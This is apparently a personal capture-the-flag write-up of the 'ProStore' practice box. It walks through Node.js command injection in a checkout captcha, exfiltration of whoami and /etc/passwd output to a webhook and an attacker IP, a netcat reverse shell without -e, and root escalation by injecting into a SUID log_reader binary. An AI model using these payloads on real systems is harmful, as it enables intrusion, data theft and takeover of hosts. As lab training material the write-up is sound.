# ProStore

We start off by scanning network:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

On port 500 we find this website:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I try to log in as admin with admin:admin

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Interesting error message maybe we can enumerate usernames by bruteforcing

But first i register and login with admin:admin and i add an item to my cart and go to checkout:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is a pretty obvious foothold direction so i enter everything and capture the request with burp:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The only error i manage to pop is when i input a string in the captcha:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So while looking up at the error:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see that it treats our input as code and does not find the variable so i need a way to call a function that is defined:

{% embed url="https://www.nodejs-security.com/blog/secure-javascript-coding-practices-against-command-injection-vulnerabilities" %}

so `child_process.exec` seems very unsecure since it does not avoid shell interpretation of arguments. Maybe we can exploit that by calling exec. Since this box is out of scope for OSCP i ask GPT, my bad skill issue

```
require('child_process').exec("whoami | curl -X POST -d @- http://ton-webhook.com");
```

Ok so i got stuck here for a bit, the webserver only allows requests on port 80:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>require('child_process').exec('nc+192.168.49.59+80')</p></figcaption></figure>

The requests work on port 80 and 443 but is blocked anywhere else, after looking it up the target system or its network might have outbound filtering that **only allows traffic on ports 80 and 443**.

So now i am able to pipe the command injection to have some interesting output on my listener:

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>require('child_process').exec('cat+/etc/passwd|nc+192.168.49.59+443')</p></figcaption></figure>

Then i tried a basic reverse shell but got no response so obvious reason is that -e is blocked so i tried finding a `nc -e` bypass:

{% embed url="https://www.keuperict.nl/posts/security/2017/08/26/netcat-without-e/" %}

```
tail -n 0 -f /tmp/1 | /bin/sh| nc -nv 10.11.0.49 443 1> /tmp/1
```

and the redirect busted my command so the final payload i injected was:

```
tail -n 0 -f /tmp/1 | /bin/sh| nc -nv 10.11.0.49 443 1> /tmp/1
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>require('child_process').exec('tail+-n+0+-f+/tmp/1+|+/bin/sh|+nc+-nv+192.168.49.59+443+1>+/tmp/1')</p></figcaption></figure>

Now i try and download linpeas

{% hint style="warning" %}
firewall blacklists connectiosn from ports ≠ 80 or 443 so i host my python server on port 80
{% endhint %}

So after running linpeas here is everything i found that seemed interesting for PE:

```sh
???????????? Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                              
/home/observer/.bash_history
/root/


-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)

-rwsr-xr-x 1 root root 20K Feb 13  2023 /usr/local/bin/log_reader (Unknown SUID binary!)

??? Possible private SSH keys were found!
/home/observer/app/backend/node_modules/dotenv/README.md


???????????? Analyzing Env Files (limit 70)
-rw-r--r-- 1 observer observer 247 Dec 23  2022 /home/observer/app/backend/.env                                                                                                     
APP_PORT=5000
DB_HOSTNAME="127.0.0.1"
DB_NAME="prostore_db"
DB_PASSWORD="d8491f5ddd9137cc3630a8a054b01cdf71110a62"
DB_PORT=5432
DB_USER="prostore"
JWT_SECRET="d148c461e7241a2c94727e17fa70b90f"
PASSWORD_HASH_SALT="a008e3dc8f8ec8a0a6e485b890d74d91"
```

I cleared most of the find except the write.ul and log reader:

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and for the log reader:

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so i try to test what i can do with  this log reader:

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

it does not seem to do anything :skull:

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ok we're getting somewhere!!!

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So it only reads log file... How could i guess that...

<figure><img src="../../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Ok we are starting to have interesting errors:

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

LETSGOOOOOOOOO

yeah so that was the easy way but it's interesting to try and get a shell since we can run command injections as root:

In this box i did something that i think i can abuse now:

{% content-ref url="../linux/rubydome.md" %}
[rubydome.md](../linux/rubydome.md)
{% endcontent-ref %}

```
/usr/local/bin/log_reader 'test.log|chmod +s /bin/bash'
```

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

My first beyond root

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
